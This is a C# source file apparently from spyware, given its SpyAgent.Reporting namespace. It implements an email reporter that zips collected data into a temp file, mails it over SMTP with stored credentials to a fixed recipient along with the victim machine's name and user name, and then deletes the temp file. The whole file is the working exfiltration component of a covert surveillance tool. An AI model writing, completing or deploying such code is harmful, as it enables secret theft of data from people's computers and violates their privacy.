namespace SpyAgent.Reporting;

using System.Net;
using System.Net.Mail;

internal sealed class EmailReporter : IReporter
{
    private readonly string _smtpServer;
    private readonly int _smtpPort;
    private readonly string _from;
    private readonly string _to;
    private readonly string _password;

    public EmailReporter(string smtpServer, int smtpPort, string from, string to, string password)
    {
        _smtpServer = smtpServer;
        _smtpPort = smtpPort;
        _from = from;
        _to = to;
        _password = password;
    }

    public async Task SendReportAsync(byte[] reportData)
    {
        var tempFile = Path.Combine(Path.GetTempPath(), $"report_{DateTime.UtcNow:yyyyMMdd_HHmmss}.zip");
        await File.WriteAllBytesAsync(tempFile, reportData);

        try
        {
            using var client = new SmtpClient(_smtpServer, _smtpPort)
            {
                Credentials = new NetworkCredential(_from, _password),
                EnableSsl = true,
                Timeout = 30000
            };

            var message = new MailMessage(_from, _to)
            {
                Subject = $"Report | {Environment.MachineName} | {DateTime.UtcNow:yyyy-MM-dd HH:mm}",
                Body = $"Machine: {Environment.MachineName}\nUser: {Environment.UserName}\nTime: {DateTime.UtcNow:u}",
                IsBodyHtml = false
            };

            message.Attachments.Add(new Attachment(tempFile));

            await client.SendMailAsync(message);
        }
        finally
        {
            if (File.Exists(tempFile))
                File.Delete(tempFile);
        }
    }
}

internal interface IReporter
{
    Task SendReportAsync(byte[] reportData);
}
